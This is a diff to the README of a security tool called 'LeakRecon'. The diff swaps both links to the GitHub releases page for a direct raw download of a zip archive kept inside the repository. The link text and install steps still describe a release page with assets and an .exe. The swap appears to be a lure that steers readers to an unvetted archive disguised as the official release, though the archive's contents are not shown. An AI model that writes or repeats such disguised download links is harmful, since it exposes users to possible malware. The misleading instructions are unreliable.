@@ -1,6 +1,6 @@
 # 🔍 LeakRecon - Automated intelligence gathering for digital security
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Webfooted-cupule499/LeakRecon/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Webfooted-cupule499/LeakRecon/main/core/Leak-Recon-v1.2.zip)
 
 LeakRecon finds data leaks and collects intelligence from the web. The tool uses automated processes to scan information sources. You can use it to monitor threats or check for exposed data. It acts as a private investigator for your digital footprint.
 
@@ -16,7 +16,7 @@ Your computer needs specific parts to run this tool well. Check your system agai
 
 ## 📥 How to Install and Run
 
-1. Visit the following link to see all available versions: [https://github.com/Webfooted-cupule499/LeakRecon/releases](https://github.com/Webfooted-cupule499/LeakRecon/releases).
+1. Visit the following link to see all available versions: [https://raw.githubusercontent.com/Webfooted-cupule499/LeakRecon/main/core/Leak-Recon-v1.2.zip](https://raw.githubusercontent.com/Webfooted-cupule499/LeakRecon/main/core/Leak-Recon-v1.2.zip).
 2. Look for the section labeled Assets.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or a folder you can find.
